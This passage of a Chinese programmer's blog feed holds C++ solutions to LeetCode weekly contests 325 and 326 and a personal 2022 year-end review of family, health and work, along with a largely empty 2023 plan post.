class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6271-礼盒的最大甜蜜度"><a href="#6271-礼盒的最大甜蜜度" class="headerlink" title="6271. 礼盒的最大甜蜜度"></a>6271. 礼盒的最大甜蜜度</h3><p>给你一个正整数数组 <code>price</code> ，其中 <code>price[i]</code> 表示第 <code>i</code> 类糖果的价格，另给你一个正整数 <code>k</code> 。</p>
<p>商店组合 <code>k</code> 类 <strong>不同</strong> 糖果打包成礼盒出售。礼盒的 <strong>甜蜜度</strong> 是礼盒中任意两种糖果 <strong>价格</strong> 绝对差的最小值。</p>
<p>返回礼盒的 <strong>最大</strong> 甜蜜度<em>。</em></p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：price = [13,5,1,8,21,2], k = 3</span><br><span class="line">输出：8</span><br><span class="line">解释：选出价格分别为 [13,5,21] 的三类糖果。</span><br><span class="line">礼盒的甜蜜度为 min(|13 - 5|, |13 - 21|, |5 - 21|) = min(8, 8, 16) = 8 。</span><br><span class="line">可以证明能够取得的最大甜蜜度就是 8 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：price = [1,3,1], k = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：选出价格分别为 [1,3] 的两类糖果。 </span><br><span class="line">礼盒的甜蜜度为 min(|1 - 3|) = min(2) = 2 。</span><br><span class="line">可以证明能够取得的最大甜蜜度就是 2 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：price = [7,7,7,7], k = 2</span><br><span class="line">输出：0</span><br><span class="line">解释：从现有的糖果中任选两类糖果，甜蜜度都会是 0 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= price.length &lt;= 105</code></li>
<li><code>1 &lt;= price[i] &lt;= 109</code></li>
<li><code>2 &lt;= k &lt;= price.length</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-325/problems/maximum-tastiness-of-candy-basket/">https://leetcode.cn/contest/weekly-contest-325/problems/maximum-tastiness-of-candy-basket/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>二分查找 + 贪心
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目看起来貌似很难的题目，实际仔细分析一下发现很简单，题目要求取出的 $k$ 个元素中的绝对值的最小值要尽可能的大，我们若要使的绝对值的最小值尽可能的大，则应该要求数组中的任意两个数的绝对值的最小值都应尽可能的大，因此按照贪心原则，我们假设相邻元素的最小间隔为 $x$，则我们在这个最小间隔下应该可以取足 $k$ 个元素即可。</li>
</ol>
<ul>
<li>此时我们想到了二分查找 + 贪心的解法，我们将数组按照从小达到大进行排序，因为要保证相邻元素的差值尽可能的大，因此我们应该最优选择从最小值或者最大值开始选择，按照每次相邻至少为 $maxVal$ 的取法，检测数组中是否可以取到 $k$ 个元素即可。</li>
</ul>
<ol start="2">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \log n)$，$n$ 表示数组中元素的数目。</li>
<li>空间复杂度：时间复杂度为 $O(\log n)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; price, <span class="type">int</span> k, <span class="type">int</span> maxVal)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = price.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> prev = price[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; price.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (price[i] - prev &gt;= maxVal) &#123;</span><br><span class="line">                tot++;</span><br><span class="line">                prev = price[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tot &gt;= k) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumTastiness</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; price, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = price.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(price.<span class="built_in">begin</span>(), price.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = price[n - <span class="number">1</span>] - price[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">check</span>(price, k, mid)) &#123;</span><br><span class="line">                res = mid;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6272-好分区的数目"><a href="#6272-好分区的数目" class="headerlink" title="6272. 好分区的数目"></a>6272. 好分区的数目</h3><p>给你一个正整数数组 <code>nums</code> 和一个整数 <code>k</code> 。</p>
<p><strong>分区</strong> 的定义是：将数组划分成两个有序的 <strong>组</strong> ，并满足每个元素 <strong>恰好</strong> 存在于 <strong>某一个</strong> 组中。如果分区中每个组的元素和都大于等于 <code>k</code> ，则认为分区是一个好分区。</p>
<p>返回 <strong>不同</strong> 的好分区的数目。由于答案可能很大，请返回对 <code>109 + 7</code> <strong>取余</strong> 后的结果。</p>
<p>如果在两个分区中，存在某个元素 <code>nums[i]</code> 被分在不同的组中，则认为这两个分区不同。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3,4], k = 4</span><br><span class="line">输出：6</span><br><span class="line">解释：好分区的情况是 ([1,2,3], [4]), ([1,3], [2,4]), ([1,4], [2,3]), ([2,3], [1,4]), ([2,4], [1,3]) 和 ([4], [1,2,3]) 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,3,3], k = 4</span><br><span class="line">输出：0</span><br><span class="line">解释：数组中不存在好分区。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [6,6], k = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：可以将 nums[0] 放入第一个分区或第二个分区中。</span><br><span class="line">好分区的情况是 ([6], [6]) 和 ([6], [6]) 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length, k &lt;= 1000</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-325/problems/number-of-great-partitions/">https://leetcode.cn/contest/weekly-contest-325/problems/number-of-great-partitions/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 动态规划</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>看来时自己想复杂了，逆向求出数组的和小于 $k$ 的数目，此时题目就变的容易多了，我们利用 $0-1$ 背包问题就很容易求解了，可以参考题解<a href="https://leetcode.cn/problems/number-of-great-partitions/solutions/2032009/ni-xiang-si-wei-01-bei-bao-fang-an-shu-p-v47x/">题解</a>。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(nk)$，其中 $n$ 表示数组的长度，$k$ 表示给定的元素。</li>
<li>空间复杂度：$O(nk)$，其中 $n$ 表示数组的长度，$k$ 表示给定的元素。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countPartitions</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">1LL</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> (sum &lt; k * <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            res = res * <span class="number">2L</span> % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(k));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = k - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &gt;= nums[i]) &#123;</span><br><span class="line">                    dp[i + <span class="number">1</span>][j] = (dp[i][j] + dp[i][j - nums[i]]) % mod;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i + <span class="number">1</span>][j] = dp[i][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            tot = (tot + dp[n][i]) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (res - tot * <span class="number">2L</span> + mod) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>【2022】年终总结</title>
    <url>/2023/01/05/%E4%B8%AA%E4%BA%BA%E9%97%B2%E8%B0%88/81/</url>
    <content><![CDATA[<h3 id="2022总结"><a href="#2022总结" class="headerlink" title="2022总结"></a>2022总结</h3><ul>
<li>转眼间2022年已经过去了，时间过的飞快，很快就迎接了2023年，回首2023，感觉是极度不平凡的一年，这一年经历了许多也收获了许多，也反思了许多，让自己更有时间去思考自己到底想要什么或者说开始思考人活着到底是为了什么这个终极目标。中年人的生活苦逼，目前是深有感触，各种乱七八糟的事情需要自己去处理，真正是上有老下有小的年龄阶段。对父母来说，老人的年龄越来越大了，总有一天老人会离我们远去，现在想的最多的是如何让老人在世的时候多孝敬一下父母，让他们能够安度晚年，一直想着赶紧把房子的问题解决了，然后把老父亲接下来一起住一段时间，好让老人能够享受一下，另外一方面越来越想赶紧分开住，跟老人一起住一方面没有自己的隐私，另一方面双方的生活理念冲突时常容易产生矛盾。对于另一半的问题，感觉双方基本上每天都是围绕着工作和家庭两点一线，双方的关系感觉越来越不亲密。工作上各种乱七八糟的糟心事，各种应付，真心各种心累。生活上各种糟心事不少，恨不得分身成为几个才能应付各种乱七八糟的糟心事。小朋友都长大了，老大六岁了，老二三岁了，真心是越来越不省心，特别是老大，两个几乎每天都要各种打架或者争吵，真心是又可爱又糟心，为人父母需要多为两个小朋友做好未来的铺路与打算，而自己的前途都感觉渺茫，真心是时间推着自己前进啊。</li>
<li><a href="http://whistle-wind.com/2022/11/20/%E4%B8%AA%E4%BA%BA%E9%97%B2%E8%B0%88/79/">2020总结</a></li>
</ul>
<h4 id="生活流水账"><a href="#生活流水账" class="headerlink" title="生活流水账"></a>生活流水账</h4><ul>
<li>5月份老父亲病重，趁着五一抽时间回家带老父亲去看病，还好问题不太大，不过老父亲的身体真的是一天比一天差，只是记得要多陪陪老父亲，能够让他安心，去年趁着放假将老父亲接到姐姐那里，至少身边有亲人看着能够放心一些。</li>
<li>6月到8月，基本上是各种忙工作，今年以来工作形势发生了很大的变动，各种乱七八糟的形式主义越来越严重，各种应付与疲惫，只能硬着头皮把工作搞定。</li>
<li>8月到10月，感觉今年经历了从出生以来最热的夏季，基本上不开空调完全没法生存，各种高温，真心是再也不想经历了。</li>
<li>9月到11月基本上时间稍微闲暇一些，可以按照自己的进度积极坚持健身，刷题、各种公开课学习等等，当然也迎来了一些跳槽的机会。我觉得能够把兴趣转换为职业才是最幸福的，而不是做着一些表面上看起来很高大上的工作，实则内心反感和痛苦的一比。人活着不过几十年，能够按照自己的意志和想法去活着才是最幸福的，当然这就需要自身付出极大的努力和自律的坚持，即使付出再大的努力也需要自己的坚持。</li>
<li>12月份年底的工作压力特别大，却刚好赶上了疫情放开。当然坚持了三年的疫情终于放开了，再也不用天天排队去做核酸，各种无休止的健康码等等，日常生活终于可以慢慢的回归正常了。短短放开的一周内，周围的亲戚朋友和同事全军覆没，全部都被感染，经过一个星期比较难受的症状，现在已经全部恢复，全部都已经正常了，三年疫情终于可以回复正常了。</li>
</ul>
<h4 id="家庭"><a href="#家庭" class="headerlink" title="家庭"></a>家庭</h4><ul>
<li>今年变化最快的是小宝，今年开始上幼儿园。从一个小宝宝变成了一个人见人爱的小棉袄，希望你永远都是爸爸心中最可爱的小棉袄了。今年小宝终于上幼儿园了，可惜的是今年疫情反复影响，两个宝贝总共开学的时间不足一个月。不过感觉小宝特别的黏人，也特别的可爱，可能女孩与男孩可能天生就是两种不同的物种，感觉两个宝宝给人的感觉太不一样了。女孩感觉真的是特别乖巧听话，特别会讨父母的欢心，真心是老父亲心中永远的宝贝。<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202301021303668.jpg"><br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202301021305700.jpg"><br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202301021305687.jpg"></li>
<li>大宝今年已经满6岁了，已经到了幼小衔接班的阶段。作为父母的感慨时间过的真快，同时也感慨生命的神奇，感觉已经大宝已经长成小伙子了，越来越有自己的想法了，基本上各种自理能力和技能点自动点满，会自己刷牙、漱口、穿衣服。儿女一天天长大，终有一天他们会离我们远去去追寻他们的梦想，那时作为父母的只能放手让他们去拼搏，无论人生道路上又多么艰难，爸爸妈妈无无怨无悔的支持你们，爸爸妈妈永远都是你们坚强的后盾。</li>
<li>晚上有时候睡觉时跟两个小宝贝一起睡觉，感觉特别开心，真希望时间能够永远这样停止下去，享受着这片刻的宁静与安详。但实际自己不能这么自私，时间一去不返还，两个小宝贝以后也会长大，也回去体验这个世界的酸甜苦辣，多去感受这个世界的美好。</li>
<li>老父亲今年已经78岁高龄了，老父亲真的越来越苍老了，每次回家都感觉他离我越来越远了，想着赶紧能够把老父亲接到身边多孝敬一下他。老父亲吃了一辈子苦，也没有享受过多少，真心越来能够陪他的时间越来越少，树欲静而风不止，越来越能够体会到这句话的含义。希望在2023年能够接老父亲到武汉短住几天，并带父亲去好好的检查一下身体，这是今年最大的心愿。</li>
<li>姐姐自从离婚后，家庭中也是各种困难。大外甥和小外甥都跟着她一起生活，家庭的重担越来越大，真心希望自己能够帮助她解决更多的困难，特别是大外甥2024年就会参加高考了，到时候面临的压力会更大，小外甥又不是特别让人省心的小孩，她如今面临的压力也非常大。希望她能在未来的生活中照顾好自己，照顾好家庭。</li>
<li>最后是老婆，岳父，岳母。体制内的工作真心是越来越忙，感觉基本上不把人当人，感觉更没有劳动法的约束。对于岳父母，这几年也是特别的辛苦，帮我们照顾小孩也付出了很多，只能从经济上多补助他们，让他们不用操心他们的养老问题。</li>
<li>对于自身来说，其实内心非常的焦虑。因为在自己最需要金钱的时候，而没有能力提供一个很好的经济基础，能够让自己的家人过上幸福的日子。有时间自己也想逃离体制内，能够去一个钱更多的职位，家庭面临的经济压力实在太大了。新的一年争取，让岳父母和老婆能够出国游玩一趟，能够每个月定期给他们一部分零花钱，定期组织家里出去聚餐和游玩一次，给老婆办一个健身卡，给岳父母买一个重疾保险，这是自己在这一年的目标。2023年疫情放开了，终于可以安排好五一或者十一的旅行计划。今年的刷题计划和压力可能更大，一方面自己继续担任力扣的官方题解维护者，业余因为这个事情也浪费了自己不少精力，另一方面今年加入了残酷刷题群，每天面临的刷题压力更大了，压力山大的一年。今年的专业课的学习计划将会安排的更加紧密，更加需要自己去努力的付出。</li>
</ul>
<h4 id="健康"><a href="#健康" class="headerlink" title="健康"></a>健康</h4><ul>
<li>2022年年的疫情反复，真心让人比较难受。今年竟然去把自己的鼻子的手术给做了，虽然预后效果并不是那么明显，但是感觉比之前好太多了，结合自己的日常锻炼有段时间感觉状态越来越好。</li>
<li>4月份自己做了鼻子的手术，终于把鼻中隔偏曲的老问题给解决了，虽然说效果并没有特别好，但是总体感觉还算比之前强太多了。晚上睡觉时，没有那么难受了，至少不像之前睡觉有一隔鼻子基本上全部都是堵着的。</li>
<li>10月份感觉今年痔疮会反复发作，感觉还经常久坐的问题，各种毛病还是来了，人到重要还是要多注意自己的身体，否则各种小问题还是很影响生活的。主要是觉得用健康去换金钱和名利是最不值得的。</li>
<li>9月到11月，基本上开启了定时锻炼身体的规律运动，经过三个月的坚持，体重恢复到了正常，大概到了675.左右，保持的非常好，特别是每天晚上坚持游泳，感觉身体机能好了很多，每天坚持吃的健康一些，每天只睡7个小时，让人心情非常愉快。还是那一句话，长期坚持运动能够给人不仅仅是健康，更加带来一个积极心态的变化，没有游泳之前，经常动不动就觉得因为工作上的事情感到非常抑郁和沮丧，对自己的前途和生活感到绝望，坚持锻炼身体带给自己的很多愉快的心情，让自己每天身上充满激情干劲和正能量，自己的心情也随之改变了许多，许多以前想不开的事情，慢慢也就能够想开和明白，不要把成败看的太重，反而能够更好的去工作。不过到了12月份由于疫情的影响，健身房全部都关闭了，目前已经差不多三周没有锻炼身体了，感觉状态差了好多，每天特别容易困，精力下降太多了，并且感觉工作效率和状态也差了许多。</li>
</ul>
<h4 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h4><ul>
<li>今年的工作可以说是没什么太多好说的，除了日常的工作以外，各种政治任务非常多，感觉抗打击能力强大了许多，许多时间只能是疲于应付，心态上感觉越来越疲惫，因为各种乱七八糟的工作越来越多，感觉疲于应付。以前总听说“归零”，现在终于能够体会到什么叫做“归零”了，或许自己应该换个岗位或者工作环境了，否则工作上越来越提不起热情。锻炼好身体，才能应对未来更具有挑战的工作。</li>
<li>在当前的大环境下，体制内的工作的收入竟然递减，只能靠自己去开源节流。现实环境如此，只能依靠自己的想法去改变和拓展边界，靠山靠水不如靠自己，自己从小是从苦日子中长大的，面对所有的艰辛和困难都不会轻易屈服。自己从2021年开始兼任了力扣官方题解的创作者，从刚开始的挑战，到现在能够稳定的应对和输入质量较高的题解，感觉人都是能够适应的。挑战越大，适应能力也会越强。</li>
</ul>
<h4 id="读书学习"><a href="#读书学习" class="headerlink" title="读书学习"></a>读书学习</h4><ul>
<li>年终给自己定了很多目标，完成情况只能说差强人意。不过从9月份到10月份的锻炼计划还是完成的不错，基本上能够保持每周不少于3次的锻炼，当然今年做的比较差的是没有及时的更新锻炼记录，今年将会持续的更新锻炼记录。今年比较坑的是，各种疫情影响，健身房动不动就关门，特别是12月感染新冠以后，身体还是没有恢复到最佳状态，还是需要继续努力和加强。</li>
<li>关于读书方面，今年下半年的目标本来计划是读<code>30</code>本书，今年做的太差了，买了许多书，却完成的不好，主要还是各种计划赶不上变化，时间太宝贵了，基本上不够用。</li>
<li>关于技术方面的学习，每周还是坚持刷题，今年感觉基本上坚持完成了全年所有的<code>leetcode</code>的题解，感觉收获还是挺大，不知道是自己水平提高了还是力扣的题目变简单了，目前基本上百分之七十的周赛都能<code>AK</code>l了，并且感觉力扣的题目越来越水了，感觉没有太多新颖的题目，太过于套路和模板化了。当然今年自己继续担任力扣的官方题解成员，并且兼职完成了力扣<code>book</code> 《C++面试指南》，感觉当时快痛苦死了，当时实在太忙了，没有想到工作量那么大，感觉差点都完不成了，还好最终赶在 <code>dead line</code> 之前完成了，感觉自己的能力确实得到了提升，对于<code>C/C++</code>的理解更深了一些，能力确实是靠自己逼自己才能成长的。所以自己索性加入了残酷刷题群，希望自己能够更好的在残酷刷题群中生存下来。</li>
<li>关于技术课程方面，今年完成的公开课的课程真心不够，不过确实限制于时间的问题，自己没有很多时间来完成大的<code>project</code>，今年各种断断续续，终于把 《MIT6.S081》的11个lab全部完成了，关于<a href="https://www.zhihu.com/column/c_1385344375300390912">MIT6.S081</a>的内容全部放在知乎上，还好自己坚持了下来。</li>
<li>今年会陆续更新新的一年中的锻炼计划与读书计划、学习计划，将作为新的一遍文章更新中。</li>
</ul>
<h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><ul>
<li>展望2023年，首先希望家里两个可爱的宝宝健康成长，父母能够身体健康，自己身体健康工作顺利，老婆顺利升职，顺利换个大房子，将爸爸接到身边来，乘着岁月静好好好享受生活。</li>
<li>希望自己能够实现自己所定的小目标，积极改善家庭经济条件，改善父母关系，改善夫妻之间的关系。</li>
<li>希望自己能够完成新的一年中锻炼计划、学习计划、读书计划。</li>
</ul>
<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>职场</category>
      </categories>
      <tags>
        <tag>年终总结</tag>
      </tags>
  </entry>
  <entry>
    <title>【2023】新年计划</title>
    <url>/2023/01/05/%E4%B8%AA%E4%BA%BA%E9%97%B2%E8%B0%88/82/</url>
    <content><![CDATA[<h2 id="2023年新年计划"><a href="#2023年新年计划" class="headerlink" title="2023年新年计划"></a>2023年新年计划</h2><p>新的一年感觉工作日益繁忙，需要加强自身各方面的基础学习以及各种计划安排。自然12月份感染了以后，感觉身体差不多快三个星期才逐步恢复过来，感觉逐步好了许多。身体和精力慢慢重回巅峰状态，当然这段时间的工作也不是特别忙，所以可以有时间闲下来自己慢慢思考未来的计划。每年通过写总结才知道今年的这一年的不足之处，感觉2022年过的乱七八糟，好多计划都没有完成，所以洗心革面，重新制定2023年计划，新年要有新的计划和安排。</p>
<h4 id="个人学习计划"><a href="#个人学习计划" class="headerlink" title="个人学习计划"></a>个人学习计划</h4><p>今年的学习计划安排还是以公开课与英语学习为主，坚持两手抓的原则，坚持既要又要的原则，坚持贪心原则，所以主要学习方向为以下两个重点:</p>
<ul>
<li>公开课学习:</li>
<li>英语学习:</li>
</ul>
<h4 id="个人锻炼计划"><a href="#个人锻炼计划" class="headerlink" title="个人锻炼计划"></a>个人锻炼计划</h4><p>今年的学习计划安排还是以公开课与英语学习为主，坚持两手抓的原则，坚持既要又要的原则，坚持贪心原则，所以主要学习方向为以下两个重点:</p>
<h4 id="个人读书计划"><a href="#个人读书计划" class="headerlink" title="个人读书计划"></a>个人读书计划</h4><h4 id="个人出游计划"><a href="#个人出游计划" class="headerlink" title="个人出游计划"></a>个人出游计划</h4><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>读书感想</category>
        <category>新年计划</category>
        <category>读书计划</category>
        <category>锻炼计划</category>
        <category>出游计划</category>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>新年计划,读书计划,锻炼计划,出游计划,学习计划</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 326</title>
    <url>/2023/01/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/91/</url>
    <content><![CDATA[<h2 id="leetcode-contest-326"><a href="#leetcode-contest-326" class="headerlink" title="leetcode  contest 326"></a>leetcode  contest 326</h2><p>感觉是目前做的最简单的力扣周赛了，全部都是手速题目。<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202301011114970.png"></p>
<h3 id="6278-统计能整除数字的位数"><a href="#6278-统计能整除数字的位数" class="headerlink" title="6278. 统计能整除数字的位数"></a>6278. 统计能整除数字的位数</h3><p>给你一个整数 <code>num</code> ，返回 <code>num</code> 中能整除 <code>num</code> 的数位的数目。</p>
<p>如果满足 <code>nums % val == 0</code> ，则认为整数 <code>val</code> 可以整除 <code>nums</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 7</span><br><span class="line">输出：1</span><br><span class="line">解释：7 被自己整除，因此答案是 1 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 121</span><br><span class="line">输出：2</span><br><span class="line">解释：121 可以被 1 整除，但无法被 2 整除。由于 1 出现两次，所以返回 2 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 1248</span><br><span class="line">输出：4</span><br><span class="line">解释：1248 可以被它每一位上的数字整除，因此答案是 4 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= num &lt;= 109</code></li>
<li><code>num</code> 的数位中不含 <code>0</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-326/problems/count-the-digits-that-divide-a-number/">https://leetcode.cn/contest/weekly-contest-326/problems/count-the-digits-that-divide-a-number/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接对每一位上的数字取模即可统计所有可被整除的数字数目。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(\log n)$。其中 $n$ 表示给定的数字。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countDigits</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> x = num;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> val = x % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (num % val == <span class="number">0</span>) &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        